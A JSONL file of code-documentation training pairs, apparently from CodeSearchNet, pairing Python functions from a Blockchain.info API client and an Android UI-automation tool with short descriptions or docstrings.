{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ncreating an ECDSA point on the SECP256k1 curve with the given coordinates.", "response": "def create_point(self, x, y):\n        \"\"\"Create an ECDSA point on the SECP256k1 curve with the given coords.\n\n        :param x: The x coordinate on the curve\n        :type x: long\n        :param y: The y coodinate on the curve\n        :type y: long\n        \"\"\"\n        if (not isinstance(x, six.integer_types) or\n                not isinstance(y, six.integer_types)):\n            raise ValueError(\"The coordinates must be longs.\")\n        return _ECDSA_Point(SECP256k1.curve, x, y)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef from_point(cls, point, network=BitcoinMainNet, **kwargs):\n        verifying_key = VerifyingKey.from_public_point(point, curve=SECP256k1)\n        return cls.from_verifying_key(verifying_key, network=network, **kwargs)", "response": "Create a PublicKey from a point on the SECP256k1 curve."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get_ticker(api_code=None):\n    \n    response = util.call_api('ticker' if api_code is None else 'ticker?api_code=' + api_code)\n    json_response = json.loads(response)\n    ticker = {}\n    for key in json_response:\n        json_ccy = json_response[key]\n        ccy = Currency(json_ccy['last'],\n                       json_ccy['buy'],\n                       json_ccy['sell'],\n                       json_ccy['symbol'],\n                       json_ccy['15m'])\n        ticker[key] = ccy\n    return ticker", "response": "Call the ticker API and return a dictionary of ccy_symbol"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef to_btc(ccy, value, api_code=None):\n    \n    res = 'tobtc?currency={0}&value={1}'.format(ccy, value)\n    if api_code is not None:\n        res += '&api_code=' + api_code\n    return float(util.call_api(res))", "response": "Convert x value in the provided currency code to BTC."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nget network statistics. :param str api_code: Blockchain.info API code (optional) :return: an instance of :class:`Stats` class", "response": "def get(api_code=None):\n    \"\"\"Get network statistics.\n    \n    :param str api_code: Blockchain.info API code (optional)\n    :return: an instance of :class:`Stats` class\n    \"\"\"\n    \n    resource = 'stats?format=json'\n    if api_code is not None:\n        resource += '&api_code=' + api_code\n    response = util.call_api(resource)\n    json_response = json.loads(response)\n    return Stats(json_response)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef get_chart(chart_type, time_span=None, rolling_average=None, api_code=None):\n\n    resource = 'charts/' + chart_type + '?format=json'\n    if time_span is not None:\n        resource += '&timespan=' + time_span\n    if rolling_average is not None:\n        resource += '&rollingAverage=' + rolling_average\n    if api_code is not None:\n        resource += '&api_code=' + api_code\n    response = util.call_api(resource)\n    json_response = json.loads(response)\n    return Chart(json_response)", "response": "Get a specific chart of a specific type."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nget number of blocks mined by each pool.", "response": "def get_pools(time_span=None, api_code=None):\n    \"\"\"Get number of blocks mined by each pool.\n\n    :param str time_span: duration of the chart.\n    Default is 4days (optional)\n    :param str api_code: Blockchain.info API code (optional)\n    :return: an instance of dict:{str,int}\n    \"\"\"\n\n    resource = 'pools'\n    if time_span is not None:\n        resource += '?timespan=' + time_span\n    if api_code is not None:\n        resource += '&api_code=' + api_code\n    response = util.call_api(resource, base_url='https://api.blockchain.info/')\n    json_response = json.loads(response)\n    return {k: v for (k, v) in json_response.items()}"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef send(self, to, amount, from_address=None, fee=None):\n        \n        recipient = {to: amount}\n        return self.send_many(recipient, from_address, fee)", "response": "Send bitcoin from your wallet to a single address."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nsends bitcoin from your wallet to multiple addresses.", "response": "def send_many(self, recipients, from_address=None, fee=None):\n        \"\"\"Send bitcoin from your wallet to multiple addresses.\n\n        :param dictionary recipients: dictionary with the structure of 'address':amount\n        :param str from_address: specific address to send from (optional)\n        :param int fee: transaction fee in satoshi. Must be greater than the default\n                        fee (optional).\n        :return: an instance of :class:`PaymentResponse` class\n        \"\"\"\n        \n        params = self.build_basic_request(read_only=False)\n\n        if len(recipients) == 1:\n            to_address, amount = recipients.popitem()\n            params['to'] = to_address\n            params['amount'] = amount\n            method = 'payment'\n        else:\n            params['recipients'] = json.dumps(recipients)\n            method = 'sendmany'\n        \n        if from_address is not None:\n            params['from'] = from_address\n        if fee is not None:\n            params['fee'] = fee\n            \n        response = util.call_api(\"merchant/{0}/{1}\".format(self.identifier, method), params,\n                                 base_url=self.service_url)\n        json_response = json.loads(response)\n        \n        self.parse_error(json_response)\n        payment_response = PaymentResponse(json_response['message'],\n                                           json_response['tx_hash'],\n                                           json_response.get('notice'))\n        return payment_response"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get_balance(self):\n        \n        response = util.call_api(\"merchant/{0}/balance\".format(self.identifier), self.build_basic_request(),\n                                 base_url=self.service_url)\n        json_response = json.loads(response)\n        self.parse_error(json_response)\n        return json_response.get('balance')", "response": "Fetch the wallet balance. Includes unconfirmed transactions\n        and possibly double spends."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nlisting all active addresses in the wallet.", "response": "def list_addresses(self):\n        \"\"\"List all active addresses in the wallet.\n\n        :return: an array of :class:`Address` objects\n        \"\"\"\n        \n        params = self.build_basic_request()\n        response = util.call_api(\"merchant/{0}/list\".format(self.identifier), params, base_url=self.service_url)\n\n        json_response = json.loads(response)\n        self.parse_error(json_response)\n        \n        addresses = []\n        for a in json_response['addresses']:\n            address = Address(a['balance'], a['address'], a.get('label'), a['total_received'])\n            addresses.append(address)\n            \n        return addresses"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_address(self, address):\n        \n        params = self.build_basic_request()\n        params['address'] = address\n\n        response = util.call_api(\"merchant/{0}/address_balance\".format(self.identifier), params,\n                                 base_url=self.service_url)\n        json_response = json.loads(response)\n        self.parse_error(json_response)\n        return Address(json_response['balance'],\n                       json_response['address'],\n                       None,\n                       json_response['total_received'])", "response": "Retrieve an address from the wallet."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef new_address(self, label=None):\n        \n        params = self.build_basic_request()\n        if label is not None:\n            params['label'] = label\n        response = util.call_api(\"merchant/{0}/new_address\".format(self.identifier), params, base_url=self.service_url)\n        json_response = json.loads(response)\n        self.parse_error(json_response)\n        return Address(0, json_response['address'], json_response.get('label'), 0)", "response": "Generate a new address and add it to the wallet."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef receive(xpub, callback, api_key):\n\n    params = {'xpub': xpub, 'key': api_key, 'callback': callback}\n    resource = 'v2/receive?' + util.urlencode(params)\n    resp = util.call_api(resource, base_url='https://api.blockchain.info/')\n    json_resp = json.loads(resp)\n    payment_response = ReceiveResponse(json_resp['address'],\n                                       json_resp['index'],\n                                       json_resp['callback'])\n    return payment_response", "response": "Call the Receive endpoint and create a forwarding address."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ncalls the v2 callback log endpoint and returns the callback log for a given callback URI with parameters.", "response": "def callback_log(callback, api_key):\n    \"\"\"Call the 'v2/receive/callback_log' endpoint and returns the callback log\n    for a given callback URI with parameters.\n\n    :param callback: callback URI\n    :param api_key: Blockchain.info API V2 key\n    :return: a list of :class:`LogEntry` objects\n    \"\"\"\n    params = {'key': api_key, 'callback': callback}\n    resource = 'v2/receive/callback_log?' + util.urlencode(params)\n    resp = util.call_api(resource, base_url='https://api.blockchain.info/')\n    json_resp = json.loads(resp)\n    return [LogEntry(e['callback'], e['called_at'], e['raw_response'], e['response_code']) for e in json_resp]"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ncalling the v2 checkgap endpoint and returns the callback log for a given extended public key", "response": "def check_gap(xpub, api_key):\n    \"\"\"Call the 'v2/receive/checkgap' endpoint and returns the callback log\n    for a given callback URI with parameters.\n\n    :param str xpub: extended public key\n    :param str api_key: Blockchain.info API V2 key\n    :return: an int\n    \"\"\"\n    params = {'key': api_key, 'xpub': xpub}\n    resource = 'v2/receive/checkgap?' + util.urlencode(params)\n    resp = util.call_api(resource, base_url='https://api.blockchain.info/')\n    json_resp = json.loads(resp)\n    return json_resp['gap']"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef create_wallet(password, api_code, service_url, priv=None, label=None, email=None):\n        \n        params = {'password': password, 'api_code': api_code}\n        if priv is not None:\n            params['priv'] = priv\n        if label is not None:\n            params['label'] = label\n        if email is not None:\n            params['email'] = email\n        \n        response = util.call_api(\"api/v2/create\", params, base_url=service_url)\n        json_response = json.loads(response)\n        return CreateWalletResponse(json_response['guid'],\n                                    json_response['address'],\n                                    json_response['label'])", "response": "Create a new Blockchain. info wallet."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get_block(block_id, api_code=None):\n\n    resource = 'rawblock/' + block_id\n    if api_code is not None:\n        resource += '?api_code=' + api_code\n    response = util.call_api(resource)\n    json_response = json.loads(response)\n    return Block(json_response)", "response": "Get a single block based on a block hash."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_tx(tx_id, api_code=None):\n\n    resource = 'rawtx/' + tx_id\n    if api_code is not None:\n        resource += '?api_code=' + api_code\n    response = util.call_api(resource)\n    json_response = json.loads(response)\n    return Transaction(json_response)", "response": "Get a single transaction based on a transaction hash."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_block_height(height, api_code=None):\n\n    resource = 'block-height/{0}?format=json'.format(height)\n    if api_code is not None:\n        resource += '&api_code=' + api_code\n    response = util.call_api(resource)\n    json_response = json.loads(response)\n    return [Block(b) for b in json_response['blocks']]", "response": "Get an array of blocks at the specified height."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_address(address, filter=None, limit=None, offset=None, api_code=None):\n\n    resource = 'address/{0}?format=json'.format(address)\n    if filter is not None:\n        if isinstance(filter, FilterType):\n            resource += '&filter=' + str(filter.value)\n        else:\n            raise ValueError('Filter must be of FilterType enum')\n    if limit is not None:\n        resource += '&limit=' + str(limit)\n    if offset is not None:\n        resource += '&offset=' + str(offset)\n    if api_code is not None:\n        resource += '&api_code=' + api_code\n    response = util.call_api(resource)\n    json_response = json.loads(response)\n    return Address(json_response)", "response": "Get data for a single address including an address balance and list of relevant transactions."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get_xpub(xpub, filter=None, limit=None, offset=None, api_code=None):\n\n    resource = 'multiaddr?active=' + xpub\n    if filter is not None:\n        if isinstance(filter, FilterType):\n            resource += '&filter=' + str(filter.value)\n        else:\n            raise ValueError('Filter must be of FilterType enum')\n    if limit is not None:\n        resource += '&limit=' + str(limit)\n    if offset is not None:\n        resource += '&offset=' + str(offset)\n    if api_code is not None:\n        resource += '&api_code=' + api_code\n    response = util.call_api(resource)\n    json_response = json.loads(response)\n    return Xpub(json_response)", "response": "Get data for a single xpub including balance and list of relevant transactions."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ngets aggregate summary for multiple addresses including overall balance per address balance and list of relevant transactions.", "response": "def get_multi_address(addresses, filter=None, limit=None, offset=None, api_code=None):\n    \"\"\"Get aggregate summary for multiple addresses including overall balance, per address balance\n     and list of relevant transactions.\n\n    :param tuple addresses: addresses(xpub or base58) to look up\n    :param FilterType filter: the filter for transactions selection (optional)\n    :param int limit: limit number of transactions to fetch (optional)\n    :param int offset: number of transactions to skip when fetch (optional)\n    :param str api_code: Blockchain.info API code (optional)\n    :return: an instance of :class:`MultiAddress` class\n    \"\"\"\n\n    if isinstance(addresses, basestring):\n        resource = 'multiaddr?active=' + addresses\n    else:\n        resource = 'multiaddr?active=' + '|'.join(addresses)\n    if filter is not None:\n        if isinstance(filter, FilterType):\n            resource += '&filter=' + str(filter.value)\n        else:\n            raise ValueError('Filter must be of FilterType enum')\n    if limit is not None:\n        resource += '&limit=' + str(limit)\n    if offset is not None:\n        resource += '&offset=' + str(offset)\n    if api_code is not None:\n        resource += '&api_code=' + api_code\n    response = util.call_api(resource)\n    json_response = json.loads(response)\n    return MultiAddress(json_response)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nget balances for each address provided.", "response": "def get_balance(addresses, filter=None, api_code=None):\n    \"\"\"Get balances for each address provided.\n\n    :param tuple addresses: addresses(xpub or base58) to look up\n    :param FilterType filter: the filter for transactions selection (optional)\n    :param str api_code: Blockchain.info API code (optional)\n    :return: a dictionary of str, :class:`Balance`\n    \"\"\"\n\n    if isinstance(addresses, basestring):\n        resource = 'balance?active=' + addresses\n    else:\n        resource = 'balance?active=' + '|'.join(addresses)\n    if filter is not None:\n        if isinstance(filter, FilterType):\n            resource += '&filter=' + str(filter.value)\n        else:\n            raise ValueError('Filter must be of FilterType enum')\n    if api_code is not None:\n        resource += '&api_code=' + api_code\n    response = util.call_api(resource)\n    json_response = json.loads(response)\n\n    return {k: Balance(v) for (k, v) in json_response.items()}"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get_unspent_outputs(addresses, confirmations=None, limit=None, api_code=None):\n\n    if isinstance(addresses, basestring):\n        resource = 'unspent?active=' + addresses\n    else:\n        resource = 'unspent?active=' + '|'.join(addresses)\n    if confirmations is not None:\n        resource += '&confirmations=' + str(confirmations)\n    if limit is not None:\n        resource += '&limit=' + str(limit)\n    if api_code is not None:\n        resource += '&api_code=' + api_code\n    response = util.call_api(resource)\n    json_response = json.loads(response)\n    return [UnspentOutput(o) for o in json_response['unspent_outputs']]", "response": "Get unspent outputs for a single address."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ngetting a list of currently unconfirmed transactions.", "response": "def get_unconfirmed_tx(api_code=None):\n    \"\"\"Get a list of currently unconfirmed transactions.\n\n    :param str api_code: Blockchain.info API code (optional)\n    :return: an array of :class:`Transaction` objects\n    \"\"\"\n\n    resource = 'unconfirmed-transactions?format=json'\n    if api_code is not None:\n        resource += '&api_code=' + api_code\n    response = util.call_api(resource)\n    json_response = json.loads(response)\n    return [Transaction(t) for t in json_response['txs']]"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nget a list of blocks for a specific day or mining pool.", "response": "def get_blocks(time=None, pool_name=None, api_code=None):\n    \"\"\"Get a list of blocks for a specific day or mining pool.\n    Both parameters are optional but at least one is required.\n\n    :param int time: time in milliseconds\n    :param str pool_name: name of the mining pool\n    :param str api_code: Blockchain.info API code (optional)\n    :return: an array of :class:`SimpleBlock` objects\n    \"\"\"\n\n    resource = 'blocks/{0}?format=json'\n    if api_code is not None:\n        resource += '&api_code=' + api_code\n    if time is not None:\n        resource = resource.format(time)\n    elif pool_name is not None:\n        resource = resource.format(pool_name)\n    else:\n        resource = resource.format('')\n\n    response = util.call_api(resource)\n    json_response = json.loads(response)\n    return [SimpleBlock(b) for b in json_response['blocks']]"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef pushtx(tx, api_code=None):\n    params = {'tx': tx}\n    if api_code is not None:\n        params['api_code'] = api_code\n    util.call_api('pushtx', params)", "response": "Push a hex encoded transaction to the network."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ntake the current screenshot and shows it on the main window.", "response": "def takeScreenshotAndShowItOnWindow(self):\n        '''\n        Takes the current screenshot and shows it on the main window.\n        It also:\n         - sizes the window\n         - create the canvas\n         - set the focus\n         - enable the events\n         - create widgets\n         - finds the targets (as explained in L{findTargets})\n         - hides the vignette (that could have been showed before)\n        '''\n\n        if PROFILE:\n            print >> sys.stderr, \"PROFILING: takeScreenshotAndShowItOnWindow()\"\n            profileStart()\n\n        if DEBUG:\n            print >> sys.stderr, \"takeScreenshotAndShowItOnWindow()\"\n        if self.vc and self.vc.uiAutomatorHelper:\n            received = self.vc.uiAutomatorHelper.takeScreenshot()\n            stream = StringIO.StringIO(received)\n            self.unscaledScreenshot = Image.open(stream)\n        else:\n            self.unscaledScreenshot = self.device.takeSnapshot(reconnect=True)\n        self.image = self.unscaledScreenshot\n        (width, height) = self.image.size\n        if self.scale != 1:\n            scaledWidth = int(width * self.scale)\n            scaledHeight = int(height * self.scale)\n            self.image = self.image.resize((scaledWidth, scaledHeight), PIL.Image.ANTIALIAS)\n            (width, height) = self.image.size\n            if self.isDarwin and 14 < self.sdkVersion < 23:\n                stream = StringIO.StringIO()\n                self.image.save(stream, 'GIF')\n                import base64\n                gif = base64.b64encode(stream.getvalue())\n                stream.close()\n        if self.canvas is None:\n            if DEBUG:\n                print >> sys.stderr, \"Creating canvas\", width, 'x', height\n            self.placeholder.grid_forget()\n            self.canvas = Tkinter.Canvas(self.mainFrame, width=width, height=height)\n            self.canvas.focus_set()\n            self.enableEvents()\n            self.createMessageArea(width, height)\n            self.createVignette(width, height)\n        if self.isDarwin and self.scale != 1 and 14 < self.sdkVersion < 23:\n            # Extremely weird Tkinter bug, I guess\n            # If the image was rotated and then resized if ImageTk.PhotoImage(self.image)\n            # is used as usual then the result is a completely transparent image and only\n            # the \"Please wait...\" is seen.\n            # Converting it to GIF seems to solve the problem\n            self.screenshot = Tkinter.PhotoImage(data=gif)\n        else:\n            self.screenshot = ImageTk.PhotoImage(self.image)\n        if self.imageId is not None:\n            self.canvas.delete(self.imageId)\n        self.imageId = self.canvas.create_image(0, 0, anchor=Tkinter.NW, image=self.screenshot)\n        if DEBUG:\n            try:\n                print >> sys.stderr, \"Grid info\", self.canvas.grid_info()\n            except:\n                print >> sys.stderr, \"Exception getting grid info\"\n        gridInfo = None\n        try:\n            gridInfo = self.canvas.grid_info()\n        except:\n            if DEBUG:\n                print >> sys.stderr, \"Adding canvas to grid (1,1)\"\n            self.canvas.grid(row=1, column=1, rowspan=4)\n        if not gridInfo:\n            self.canvas.grid(row=1, column=1, rowspan=4)\n        self.findTargets()\n        self.hideVignette()\n        if DEBUG:\n            try:\n                self.printGridInfo()\n            except:\n                pass\n        if PROFILE:\n            profileEnd()"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\npopulates the View tree with the information from the given view.", "response": "def populateViewTree(self, view):\n        '''\n        Populates the View tree.\n        '''\n\n        vuid = view.getUniqueId()\n        text = view.__smallStr__()\n        if view.getParent() is None:\n            self.viewTree.insert('', Tkinter.END, vuid, text=text)\n        else:\n            self.viewTree.insert(view.getParent().getUniqueId(), Tkinter.END, vuid, text=text, tags=('ttk'))\n            self.viewTree.set(vuid, 'T', '*' if view.isTarget() else ' ')\n            self.viewTree.tag_bind('ttk', '<1>', self.viewTreeItemClicked)"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nfinds the target Views.", "response": "def findTargets(self):\n        '''\n        Finds the target Views (i.e. for touches).\n        '''\n\n        if DEBUG:\n            print >> sys.stderr, \"findTargets()\"\n        LISTVIEW_CLASS = 'android.widget.ListView'\n        ''' The ListView class name '''\n        self.targets = []\n        ''' The list of target coordinates (x1, y1, x2, y2) '''\n        self.targetViews = []\n        ''' The list of target Views '''\n        if CHECK_KEYBOARD_SHOWN:\n            if self.device.isKeyboardShown():\n                print >> sys.stderr, \"#### keyboard is show but handling it is not implemented yet ####\"\n                # FIXME: still no windows in uiautomator\n                window = -1\n            else:\n                window = -1\n        else:\n            window = -1\n        if self.vc:\n            dump = self.vc.dump(window=window, sleep=0.1)\n            self.printOperation(None, Operation.DUMP, window, dump)\n        else:\n            dump = []\n        self.dump = dump\n        # the root element cannot be deleted from Treeview once added.\n        # We have no option but to recreate it\n        self.viewTree = ViewTree(self.sideFrame)\n        for v in dump:\n            if DEBUG:\n                print >> sys.stderr, \"    findTargets: analyzing\", v.getClass(), v.getId()\n            if v.getClass() == LISTVIEW_CLASS:\n                # We may want to touch ListView elements, not just the ListView\n                continue\n            parent = v.getParent()\n            if (parent and parent.getClass() == LISTVIEW_CLASS and self.isClickableCheckableOrFocusable(parent)) \\\n                    or self.isClickableCheckableOrFocusable(v):\n                # If this is a touchable ListView, let's add its children instead\n                # or add it if it's touchable, focusable, whatever\n                ((x1, y1), (x2, y2)) = v.getCoords()\n                if DEBUG:\n                    print >> sys.stderr, \"appending target\", ((x1, y1, x2, y2))\n                v.setTarget(True)\n                self.targets.append((x1, y1, x2, y2))\n                self.targetViews.append(v)\n                target = True\n            else:\n                target = False\n\n        if self.vc:\n            self.vc.traverse(transform=self.populateViewTree)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef touchPoint(self, x, y):\n        '''\n        Touches a point in the device screen.\n        The generated operation will use the units specified in L{coordinatesUnit} and the\n        orientation in L{vc.display['orientation']}.\n        '''\n\n        if DEBUG:\n            print >> sys.stderr, 'touchPoint(%d, %d)' % (x, y)\n            print >> sys.stderr, 'touchPoint:', type(x), type(y)\n        if self.areEventsDisabled:\n            if DEBUG:\n                print >> sys.stderr, \"Ignoring event\"\n            self.canvas.update_idletasks()\n            return\n        if DEBUG:\n            print >> sys.stderr, \"Is touching point:\", self.isTouchingPoint\n        if self.isTouchingPoint:\n            self.showVignette()\n            if self.vc:\n                self.vc.touch(x, y)\n            if self.coordinatesUnit == Unit.DIP:\n                x = round(x / self.device.display['density'], 2)\n                y = round(y / self.device.display['density'], 2)\n            self.printOperation(None, Operation.TOUCH_POINT, x, y, self.coordinatesUnit,\n                                self.device.display['orientation'])\n            self.printOperation(None, Operation.SLEEP, Operation.DEFAULT)\n            # FIXME: can we reduce this sleep? (was 5)\n            time.sleep(1)\n            self.isTouchingPoint = self.vc is None\n            self.takeScreenshotAndShowItOnWindow()\n            # self.hideVignette()\n            self.statusBar.clear()\n            return", "response": "Touch a point in the device screen."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nlong - touch a point in the device screen.", "response": "def longTouchPoint(self, x, y):\n        '''\n        Long-touches a point in the device screen.\n        The generated operation will use the units specified in L{coordinatesUnit} and the\n        orientation in L{vc.display['orientation']}.\n        '''\n\n        if DEBUG:\n            print >> sys.stderr, 'longTouchPoint(%d, %d)' % (x, y)\n        if self.areEventsDisabled:\n            if DEBUG:\n                print >> sys.stderr, \"Ignoring event\"\n            self.canvas.update_idletasks()\n            return\n        if DEBUG:\n            print >> sys.stderr, \"Is long touching point:\", self.isLongTouchingPoint\n        if self.isLongTouchingPoint:\n            self.showVignette()\n            self.vc.longTouch(x, y)\n            if self.coordinatesUnit == Unit.DIP:\n                x = round(x / self.device.display['density'], 2)\n                y = round(y / self.device.display['density'], 2)\n            self.printOperation(None, Operation.LONG_TOUCH_POINT, x, y, 2000, self.coordinatesUnit,\n                                self.device.display['orientation'])\n            self.sleep(5)\n            self.isLongTouchingPoint = False\n            self.takeScreenshotAndShowItOnWindow()\n            # self.hideVignette()\n            self.statusBar.clear()\n            return"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ngenerates a key press on the device and prints the line in the script.", "response": "def command(self, keycode):\n        '''\n        Presses a key.\n        Generates the actual key press on the device and prints the line in the script.\n        '''\n\n        self.device.press(keycode)\n        self.printOperation(None, Operation.PRESS, keycode)"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ncancel the ongoing operation if any.", "response": "def cancelOperation(self):\n        '''\n        Cancels the ongoing operation if any.\n        '''\n        if self.isLongTouchingPoint:\n            self.toggleLongTouchPoint()\n        elif self.isTouchingPoint:\n            self.toggleTouchPoint()\n        elif self.isGeneratingTestCondition:\n            self.toggleGenerateTestCondition()"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef saveSnapshot(self):\n        '''\n        Saves the current shanpshot to the specified file.\n        Current snapshot is the image being displayed on the main window.\n        '''\n\n        filename = self.snapshotDir + os.sep + '${serialno}-${focusedwindowname}-${timestamp}' + '.' + self.snapshotFormat.lower()\n        # We have the snapshot already taken, no need to retake\n        d = FileDialog(self, self.device.substituteDeviceTemplate(filename))\n        saveAsFilename = d.askSaveAsFilename()\n        if saveAsFilename:\n            _format = os.path.splitext(saveAsFilename)[1][1:].upper()\n            self.printOperation(None, Operation.SNAPSHOT, filename, _format, self.deviceArt, self.dropShadow,\n                                self.screenGlare)\n            # FIXME: we should add deviceArt, dropShadow and screenGlare to the saved image\n            # self.unscaledScreenshot.save(saveAsFilename, _format, self.deviceArt, self.dropShadow, self.screenGlare)\n            self.unscaledScreenshot.save(saveAsFilename, _format)", "response": "Saves the current shanpshot to the specified file."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef saveViewSnapshot(self, view):\n        '''\n        Saves the View snapshot.\n        '''\n\n        if not view:\n            raise ValueError(\"view must be provided to take snapshot\")\n        filename = self.snapshotDir + os.sep + '${serialno}-' + view.variableNameFromId() + '-${timestamp}' + '.' + self.snapshotFormat.lower()\n        d = FileDialog(self, self.device.substituteDeviceTemplate(filename))\n        saveAsFilename = d.askSaveAsFilename()\n        if saveAsFilename:\n            _format = os.path.splitext(saveAsFilename)[1][1:].upper()\n            self.printOperation(view, Operation.VIEW_SNAPSHOT, filename, _format)\n            view.writeImageToFile(saveAsFilename, _format)", "response": "Saves the view snapshot."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ntoggling the long touch point operation.", "response": "def toggleLongTouchPoint(self):\n        '''\n        Toggles the long touch point operation.\n        '''\n        if not self.isLongTouchingPoint:\n            msg = 'Long touching point'\n            self.toast(msg, background=Color.GREEN)\n            self.statusBar.set(msg)\n            self.isLongTouchingPoint = True\n            # FIXME: There should be 2 methods DIP & PX\n            self.coordinatesUnit = Unit.PX\n        else:\n            self.toast(None)\n            self.statusBar.clear()\n            self.isLongTouchingPoint = False"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef toggleLongTouchView(self):\n        '''\n        Toggles the long touch View operation.\n        :return:\n        '''\n        if not self.isLongTouchingView:\n            msg = 'Long touching View'\n            self.toast(msg, background=Color.GREEN)\n            self.statusBar.set(msg)\n            self.isLongTouchingView = True\n        else:\n            self.toast(None)\n            self.statusBar.clear()\n            self.isLongTouchingView = False", "response": "Toggles the long touch view operation."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef toggleTouchPoint(self):\n        '''\n        Toggles the touch point operation using the units specified in L{coordinatesUnit}.\n\n        When there are L{View}s (obtained from the back-end) we have to determine if the\n        intention when something is touched on the window if we want to touch the L{View}\n        or the point.\n\n        If there's no back-end, we don't allow L{self.isTouchingPoint} to be disabled so we will\n        never be attempting to touch L{View}s.\n        '''\n\n        if not self.isTouchingPoint:\n            msg = 'Touching point (units=%s)' % self.coordinatesUnit\n            self.toast(msg, background=Color.GREEN)\n            self.statusBar.set(msg)\n            self.isTouchingPoint = True\n        else:\n            self.toast(None)\n            self.statusBar.clear()\n            self.isTouchingPoint = self.vc is None", "response": "Toggles the touch point operation using the units specified in coordinatesUnit."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef getWifiState(self):\n        '''\n        Gets the Wi-Fi enabled state.\n\n        @return: One of WIFI_STATE_DISABLED, WIFI_STATE_DISABLING, WIFI_STATE_ENABLED, WIFI_STATE_ENABLING, WIFI_STATE_UNKNOWN\n        '''\n\n        result = self.device.shell('dumpsys wifi')\n        if result:\n            state = result.splitlines()[0]\n            if self.WIFI_IS_ENABLED_RE.match(state):\n                return self.WIFI_STATE_ENABLED\n            elif self.WIFI_IS_DISABLED_RE.match(state):\n                return self.WIFI_STATE_DISABLED\n        print >> sys.stderr, \"UNKNOWN WIFI STATE:\", state\n        return self.WIFI_STATE_UNKNOWN", "response": "Gets the Wi - Fi enabled state."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nsets a timer. :param description: :param timeout: timeout in seconds :return: the timerId", "response": "def setTimer(self, timeout, description=None):\n        \"\"\"\n        Sets a timer.\n\n        :param description:\n        :param timeout: timeout in seconds\n        :return: the timerId\n        \"\"\"\n        self.timerId += 1\n        timer = Timer(timeout, self.__timeoutHandler, (self.timerId, description))\n        timer.start()\n        self.timers[self.timerId] = timer\n        return self.timerId"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef getRestrictedScreen(self):\n        ''' Gets C{mRestrictedScreen} values from dumpsys. This is a method to obtain display dimensions '''\n\n        rsRE = re.compile('\\s*mRestrictedScreen=\\((?P<x>\\d+),(?P<y>\\d+)\\) (?P<w>\\d+)x(?P<h>\\d+)')\n        for line in self.shell('dumpsys window').splitlines():\n            m = rsRE.match(line)\n            if m:\n                return m.groups()\n        raise RuntimeError(\"Couldn't find mRestrictedScreen in 'dumpsys window'\")", "response": "Gets the restricted screen values from dumpsys. This method is a method to obtain display dimensions."}
